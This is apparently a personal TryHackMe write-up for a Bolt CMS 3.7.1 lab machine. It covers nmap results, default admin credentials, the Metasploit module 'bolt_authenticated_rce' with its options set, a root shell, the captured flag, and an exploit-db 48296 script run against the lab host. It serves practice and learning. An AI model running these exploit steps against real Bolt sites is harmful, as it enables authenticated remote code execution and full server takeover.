## Nmap
```
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f385ec54f201b19440de42e821972080 (RSA)
|   256 77c7c1ae314121e4930e9add0b29e1ff (ECDSA)
|_  256 070543469db23ef04d6967e491d3d37f (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
8000/tcp open  http    (PHP 7.2.32-1)

```


### HTTP 8000

1. Found login at `http://10.10.97.103:8000/bolt/login`
cred `bolt:boltadmin123`

we can find the creds at `http://10.10.154.67:8000/`



2. Found version details at bottom left corner
```
bolt 3.7.1
```

3. Used this resource to for manual exploitation guide

`https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/bolt-cms`


4. Tried python script, metasploit exploit and above link method but was failing and got stuck here, will try this again sometime later

### Metasploit method

- searched for bolt cms exploits

```
[msf](Jobs:0 Agents:0) >> search bolt
```

- used this `exploit/unix/webapp/bolt_authenticated_rce`

- set the necessary options 
```
 set LHOST 10.17.24.189
set PASSWORD boltadmin123
set USERNAME bolt
 set RHOSTS 10.10.154.67
 run

```

- We easily get root
```
id
uid=0(root) gid=0(root) groups=0(root)
```

- found the flag at `/home/flag.txt`
```
cat /home/flag.txt
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```


### Manual exploitation


- using this https://www.exploit-db.com/exploits/48296

- downloaded the file, read the python script and this is a csrf, session attack(little advanced for me but will get back on this)

- ran this command , waited for a minute and got RCE

```
┌─[glack@parrot]─[~/Desktop/THM/bolt]
└──╼ $sudo python3 48296.py http://10.10.154.67:8000 bolt boltadmin123
```